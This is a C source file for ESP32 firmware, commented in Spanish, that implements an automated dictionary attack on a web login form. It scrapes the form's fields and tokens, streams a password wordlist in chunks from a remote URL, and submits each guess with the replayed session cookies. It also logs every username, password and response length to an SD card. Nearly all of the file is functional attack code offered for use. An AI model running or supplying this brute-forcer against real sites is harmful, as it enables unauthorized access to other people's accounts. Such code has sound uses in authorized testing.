#include "login_brute_force.h"
#include "wifi_config.h"

#define DELAY(ms) vTaskDelay(pdMS_TO_TICKS(ms))
#define MAX_HTTP_OUTPUT_BUFFER 4096
#define CHUNK_SIZE 100
#define MAX_COOKIE_NUM 5
#define MAX_COOKIE_VALUE_LEN 50
#define MAX_COOKIE_KEY_LEN 50

static const char *TAG = "LOGIN-brute";
static char file_path[256];

esp_http_client_handle_t httpClient; //Cliente para atacar web
static char outputBuffer[MAX_HTTP_OUTPUT_BUFFER] = {0}; //Descargar información
static char buffer[CHUNK_SIZE + 1] = {0}; 
static char *format; // Formato body POST
typedef struct {
    char* name;
} FormField; // Extracción datos
static bool datos_extraidos = false;

static bool last_chunk = false; //Descarga datos

// COOKIE MANAGEMENT
typedef struct {
    char key[MAX_COOKIE_KEY_LEN];
    char value[MAX_COOKIE_VALUE_LEN];
} Cookie;

typedef struct {
    Cookie cookies[MAX_COOKIE_NUM];
    int count;
} CookieJar;

static CookieJar my_cookies = { .count = 0 };
static char cookie_string[256];

static void add_cookie(char* cookie_value){
    char cookie_buffer[512];
    bool is_new = true;
    strncpy(cookie_buffer, cookie_value, sizeof(cookie_buffer) - 1);
    cookie_buffer[sizeof(buffer) - 1] = '\0';
    char* saveptr;
    /* Extrae el nombre de la cookie tokenizando y cogiendo el primer valor */
    char* key = strtok_r(cookie_buffer, "=", &saveptr);
    /* Extrae el valor (hasta el primer ';') sobre el segundo valor anterior  */ 
    char* value = strtok_r(NULL, ";", &saveptr);
    if (key == NULL || value == NULL){
        ESP_LOGE(TAG, "Formato de cookie inválido: %s", cookie_value);
        return;
    }
    /* Comprobamos si existe */
    for (int i=0; i < my_cookies.count; i++){
        if (strcmp(my_cookies.cookies[i].key, key) == 0){
            /* Actualizamos el valor */
            strncpy(my_cookies.cookies[i].value, value, MAX_COOKIE_VALUE_LEN - 1);
            my_cookies.cookies[i].value[MAX_COOKIE_VALUE_LEN - 1] = '\0';
            /* La cookie se ha actualizado por lo que no tiene clave nueva */
            is_new = false;
        }
    }
    /* Añadir la cookie si no existia */
    if (my_cookies.count < MAX_COOKIE_NUM && is_new) { 
        strncpy(my_cookies.cookies[my_cookies.count].key, key, MAX_COOKIE_KEY_LEN - 1);
        strncpy(my_cookies.cookies[my_cookies.count].value, value, MAX_COOKIE_VALUE_LEN - 1);
        my_cookies.cookies[my_cookies.count].key[MAX_COOKIE_KEY_LEN - 1] = '\0';
        my_cookies.cookies[my_cookies.count].value[MAX_COOKIE_VALUE_LEN - 1] = '\0';
        my_cookies.count++;
    }
}

static void extract_cookies() {
    cookie_string[0] = '\0';
    int max_len = sizeof(cookie_string);
    int offset = 0;
    for (int i = 0; i < my_cookies.count; i++) {
        /* Insertamos cada cookie siguiendo el formato */
        int written = snprintf( cookie_string + offset, max_len - offset, "%s=%s%s", 
                               my_cookies.cookies[i].key, my_cookies.cookies[i].value,
                               (i == my_cookies.count - 1) ? "" : "; ");
        if (written < 0 || (size_t)written >= max_len - offset) {
            /* Evitar sobrepasar el tamaño máximo */
            break;
        }
        offset += written;
    }
}

static esp_err_t http_event_handler(esp_http_client_event_t *evt) {
    switch (evt->event_id) {
        case HTTP_EVENT_ON_DATA:
            break;
        case HTTP_EVENT_ERROR:
            ESP_LOGE(TAG, "HTTP error occurred\n");
            break;
        case HTTP_EVENT_ON_HEADER:  
            if (strcmp(evt->header_key, "Set-Cookie") == 0){
                /* Guardar o actualizar cookie */
                add_cookie(evt->header_value);
            }
            else if (strcmp(evt->header_key, "Location") == 0){
                /* Escribir location para demostración */
                char data[64];
                snprintf(data, sizeof(data), "HEADER: %s: %s ", evt->header_key, evt->header_value);
                sd_write_file(file_path, data);
            }
            break;
        case HTTP_EVENT_HEADERS_SENT:
            break;
        case HTTP_EVENT_REDIRECT:
            break;
        default:
            break;
    }
    return ESP_OK;
}

static void write_results(char* username, char* password, int64_t content_length){
    /* Escribir resultados en SD */
    char data[256];
    snprintf(data, sizeof(data), "USER: %s PASSWORD: %s - length: %llu\n", username, password, content_length);
    sd_write_file(file_path, data);
}

static void extract_form_fields(){
    size_t fields_count = 0;
    FormField* fields = NULL; 
    char* form_key = "<form ";
    /* EXTRACCIÓN DE DATOS */
    /* Inicio del formulario */
    char* form_start = strstr(outputBuffer, form_key);
    if (form_start == NULL){
        ESP_LOGE(TAG, "No hay formulario o no se encuentra");
    }
    else{
        /* Empezamos a buscar desde el final de la ocurrencia */
        form_start += strlen(form_key);
        char* input_key = "<input "; 
        bool all_inputs_found = false;
        while (!all_inputs_found){
            /* Buscar input */
            char* input_start = strstr(form_start, input_key);
            if (input_start == NULL){
                all_inputs_found = true;
            }
            else{ /* Se ha encontrado input */
                char* name_key = "name=";
                char* value_key = "value=";
                bool value_found = false;
                input_start+=strlen(input_key);
                char* name_value = strstr(input_start, name_key);
                if (name_value == NULL){
                    /* TAG sin value */
                    continue;
                }
                /* Final del scope del tag */
                char *tag_end = strchr(input_start, '>'); 
                if (tag_end == NULL) {
                    ESP_LOGW(TAG, "Final de scope no encontrado");
                    continue;
                }
                /* Buscamos "value=" dentro del scope del input */
                char* value_pos = strstr(input_start, value_key);
                size_t value_pos_length = 0;
                if (value_pos && value_pos < tag_end) {
                    /* Avanza después de "value=" */
                    value_pos += strlen(value_key); 
                    char quote = *value_pos;
                    /* Final del valor de value (+1 por la comilla) */
                    char* end = strchr(value_pos+1, quote); 
                    if (end) {
                        value_pos_length = end - value_pos - 1; // Descontar comilla
                        value_found = true;
                    }
                }
                else{
                    /* No hay value= en ete scope*/
                    value_found = false;
                }
                /* Inicio del valor del name del input */
                name_value += strlen(name_key); 
                char quote_type = *name_value;
                /* Final del valor de name */
                char* name_value_end = strchr(name_value+1, quote_type);
                /* Obtenemos el valor entre el inicio y el final*/
                if (name_value_end){ 
                    size_t name_value_length = name_value_end - name_value - 1; // Descontar comilla
                    char* value;
                    if (value_found){
                        /* "usertoken" + "=" + "213abc" + "\0" */
                        value = malloc(name_value_length + 1 + value_pos_length + 1);
                    }
                    else{
                        /* "username" + "=" + "%s" + "\0" */
                        value = malloc(name_value_length + 1 + 2 + 1);  
                    }
                    /* Puntero para escribir poco a poco */
                    char* ptr = value;
                    if (value){
                        /* Pasamos el valor */
                        strncpy(value, name_value+1, name_value_length);
                        /* Movemos el puntero */
                        ptr += name_value_length; 
                        /* Añadimos el = */
                        strncpy(ptr, "=", strlen("="));
                        ptr += strlen("=");
                        /* Si existe otro valor */
                        if (value_found){ 
                            /* +1 por la comilla */
                            strncpy(ptr, value_pos + 1, value_pos_length);
                            /* Marca final */
                            value[name_value_length + 1 + value_pos_length] = '\0';

                        }
                        else{
                            strncpy(ptr, "%s", strlen("%s"));
                            /* Marca final */
                            value[name_value_length + 3] = '\0';
                        }
                        /* Guardar value para construir peticion */
                        FormField* temp_fields = realloc(fields, (fields_count + 1) * sizeof(FormField));
                        if (!temp_fields) {
                            ESP_LOGE(TAG, "No se pudo reasignar memoria para los campos");
                            free(value);
                            break;
                        }
                        fields = temp_fields;
                        fields[fields_count].name = value;
                        fields_count++;
                    }
                    else{
                        ESP_LOGE(TAG, "No se pudo asignar memoria para value");
                    }
                }
                else{
                    ESP_LOGE(TAG, "No cierra");
                }
            }
            /* En la proxima iteracion busca desde el final del anterior input */
            form_start = input_start;
        }
    }
    /* CONSTRUIMOS EL BODY DEL POST */
    size_t final_string_size = 1;  // Para la terminación nula 
    for (size_t i = 0; i < fields_count; i++) {
        final_string_size += (strlen(fields[i].name)); 
    }
    /* Añadimos el tamaño de los '&' */
    final_string_size += (fields_count - 1); 
    format = malloc(final_string_size);
    if (format == NULL){
        ESP_LOGE(TAG, "No se ha podido reservar memoria para final_string");       
    }
    /* Inicializar como cadena vacía para funcionamiento de strcat */
    format[0] = '\0'; 
    for (size_t i = 0; i < fields_count; i++) {
        /* Añadimos el name al finalstring */
        strcat(format, fields[i].name);
        if (i < fields_count - 1) {
            /* Añadimos el & si no es la ultima */
            strcat(format, "&");
        }
    }
    /* Marcamos que se han extraído los datos */
    datos_extraidos = true;
}

static void post_request(char* username, char* password){
    /* CREACIÓN DEL BODY DEL POST */
    int postDataSize = snprintf(NULL, 0, format, username, password) + 1;
    if (postDataSize < 0){
        ESP_LOGE(TAG, "Error calculando postDataSize");
    }
    char* postData = malloc(postDataSize); 
    if (postData == NULL){
        ESP_LOGE(TAG, "Error al reservar memoria para el POST");
    }
    snprintf(postData, postDataSize, format, username, password);

    /* CREACIÓN DE HEADERS */
    esp_http_client_set_method(httpClient, HTTP_METHOD_POST);
    extract_cookies();
    esp_http_client_set_header(httpClient, "Cookie", cookie_string);
    esp_http_client_set_header(httpClient, "Content-Type", "application/x-www-form-urlencoded");

    /* ENVIAR REQUEST */
    esp_err_t err = esp_http_client_open(httpClient, strlen(postData));
    if (err == ESP_FAIL){
        ESP_LOGE(TAG, "Ha fallado la conexión POST a la url");
    }
    else{
        /* Envio de request */
        int wlen = esp_http_client_write(httpClient, postData, strlen(postData));
        if (wlen < 0){
            ESP_LOGE(TAG, "Ha fallado el write a la url");
        }
        else{
            /* Lectura de respuesta */
            int contentLength = esp_http_client_fetch_headers(httpClient);
            if (contentLength < 0){
                ESP_LOGE(TAG, "Error en la respuesta del POST");
            }
            else{
                int data_read = esp_http_client_read_response(httpClient, outputBuffer, MAX_HTTP_OUTPUT_BUFFER);
                if (data_read >= 0){
                    int64_t content_length = esp_http_client_get_content_length(httpClient);
                    ESP_LOGI(TAG, "HTTP POST Status = %d, content_length = %"PRId64,
                        esp_http_client_get_status_code(httpClient),
                        content_length);
                    /* Guardamos resultados de la respuesta */
                    write_results(username, password, contentLength);
                }
                else{
                    ESP_LOGE(TAG, "Error leyendo respuesta");
                }
            }
        }
        esp_http_client_close(httpClient);
    }
    free(postData); 
}

static int process_chunk(char * user) {
    /*  Divide por espacio osalto de linea */
    char *token; 
    /* Puntero auxiliar para strtok_r() */
    char *saveptr; 
    int size = 0;
    token = strtok_r(buffer, " \n", &saveptr);
    while (token != NULL) {
        ESP_LOGI(TAG, "Intentando palabra: %s", token);
        /* Guardamos tamaño del token para corregir palabras cortadas */
        size = strlen(token);
        /* Realizar petición POST */
        post_request(user, token);
        DELAY(2000); ////????????
        /* Siguiente palabra */
        token = strtok_r(NULL, " \n", &saveptr);
    }
    return size;
}

static int fetch_chunk(int start, int end, char * dict_url, char * user) {
    /* Construcción header Range */
    char range_header[64];
    snprintf(range_header, sizeof(range_header), "bytes=%d-%d", start, end);
    esp_http_client_config_t config = {
        .url = dict_url,
        .skip_cert_common_name_check = true, 
        .cert_pem = NULL,
        .auth_type = HTTP_AUTH_TYPE_NONE,
    };
    /* Cliente HTTP */
    esp_http_client_handle_t client = esp_http_client_init(&config);
    if (client == NULL) {
        ESP_LOGE(TAG, "Error al inicializar el cliente HTTP de diccionarios");
    }
    else{
        int drift = 0;
        esp_http_client_set_header(client, "Range", range_header);
        esp_http_client_set_method(client, HTTP_METHOD_GET);
        
        /* Abrir la conexión HTTP */
        esp_err_t err = esp_http_client_open(client, 0);
        if (err == ESP_FAIL){
            ESP_LOGE(TAG, "Error al hacer la petición del diccionario");
            esp_http_client_cleanup(client);
            return -1;
        }
        else{
            int contentLength = esp_http_client_fetch_headers(client);
            if (contentLength < 0){
                if (contentLength == ESP_FAIL){
                    ESP_LOGE(TAG, "Ha fallado fetch_headers");
                    esp_http_client_close(client);
                    esp_http_client_cleanup(client);
                    return -1;
                }
                else{
                    ESP_LOGE(TAG, "fetch_headers time out");
                    esp_http_client_close(client);
                    esp_http_client_cleanup(client);
                    return -1;
                }
            }
            /* Se ha llegado al último bloque */
            if (contentLength < CHUNK_SIZE){
                last_chunk = true;
            }
            int len = esp_http_client_read_response(client, buffer, CHUNK_SIZE);
            esp_http_client_close(client);
            
            if (len > 0) {
                /* Aseguramos que es una cadena válida */
                buffer[len] = '\0'; 
                DELAY(5000); //?
                /* Procesamos las palabras una vez están en el buffer */
                drift = process_chunk(user); 
                return drift;
            } else {
                ESP_LOGE(TAG, "Error recibiendo datos");
                esp_http_client_cleanup(client);
                return -1;
            }
        }
    }
    return -1;
}

static int get_request(){
    esp_err_t meth_err = esp_http_client_set_method(httpClient, HTTP_METHOD_GET);
    if (meth_err == ESP_ERR_INVALID_ARG){
        ESP_LOGE(TAG, "Error definiendo el método");
        return -1;
    }
    esp_err_t err = esp_http_client_open(httpClient, 0);
    if (err == ESP_FAIL){
        ESP_LOGE(TAG, "Ha fallado la conexión GET a la url especificada");
        return -1;
    }
    else if (err == ESP_OK){
        int contentLength = esp_http_client_fetch_headers(httpClient);
        if (contentLength < 0){
            if (contentLength == ESP_FAIL){
                ESP_LOGE(TAG, "Ha fallado fetch_headers");
                return -1;
            }
            else{
                ESP_LOGE(TAG, "fetch_headers time out");
                return -1;
            }
        }
        else {
            int data_read = esp_http_client_read_response(httpClient, outputBuffer, MAX_HTTP_OUTPUT_BUFFER);
            if (data_read >= 0){
                ESP_LOGI(TAG, "HTTP GET Status = %d, content_length = %"PRId64,
                    esp_http_client_get_status_code(httpClient),
                    esp_http_client_get_content_length(httpClient));
                esp_http_client_close(httpClient);
                return 0;
            }
        }
    }
    else{
        ESP_LOGE(TAG, "Error desconocido en la solicitud GET %i", err);
        return -1;
    }
    return -1;
}

void brute_force_attack(char* url, char* user, char* dict_url){
    if (!connected_to_wifi){
        ESP_LOGE(TAG, "No hay conexión a internet");
        
    }
    else{
        /* CONFIGURATION */ 
        esp_http_client_config_t httpConfig = {
            .url = url,
            .disable_auto_redirect = false,
            .event_handler = http_event_handler,
            .user_agent = "my-esp32-user-agent", 
        };
        httpClient = esp_http_client_init(&httpConfig);
        /* GET REQUEST */ 
        int get_err = get_request();

        /* DATA EXTRACTION AND POST BODY BUILD */ 
        if (get_err == 0){
            /* Construcción del BODY */
            extract_form_fields();
            /* Esperamos a que se extraigan los datos para evitar acceder a memoria no inicializada */
            ESP_LOGI(TAG, "Extrayendo datos...");
            while(!datos_extraidos){ 
                DELAY(500);
            }
            if (format == NULL){
                ESP_LOGE("ERROR", "No se han obtenido los campos del formulario");
                // Terminar 
            }
            else{
                ESP_LOGI(TAG, "Format: %s", format);
            }
        }
        else{
            ESP_LOGE(TAG, "No se han podido extraer datos porque no hay");
        }
        /* RESULTS FILE */ 
        char timestamp[64];
        get_timestamp(timestamp);
        snprintf(file_path, sizeof(file_path), "results/login-brute-force/login-%s.txt", timestamp);

        /* DICTIONARY CHUNKS DOWNLOAD AND POST REQUESTS (ATTACK) */
        if (get_err == -1 || format == NULL){
            ESP_LOGE(TAG, "Error en la petición GET o en la construcción del formato");
        }
        else {
            ESP_LOGI(TAG, "Iniciando descarga por partes del diccionario...");
            /* Reseteamos variables globales */
            int drift = 0; 
            last_chunk = false; 
            /* OBTENER DICCIONARIO POR BLOQUES */
            int dict_byte_size = 10000; 
            for (int i = 0; i < dict_byte_size; i += CHUNK_SIZE) {  
                drift += fetch_chunk(i - drift, i + CHUNK_SIZE - 1 - drift, dict_url, user);
                if (drift == -1){
                    ESP_LOGE(TAG, "Error descargando chunk");
                    break;
                }
                if (last_chunk){
                    ESP_LOGI(TAG, "Descarga finalizada.");
                    break;
                }
            }
        }
        esp_http_client_cleanup(httpClient);
    }
}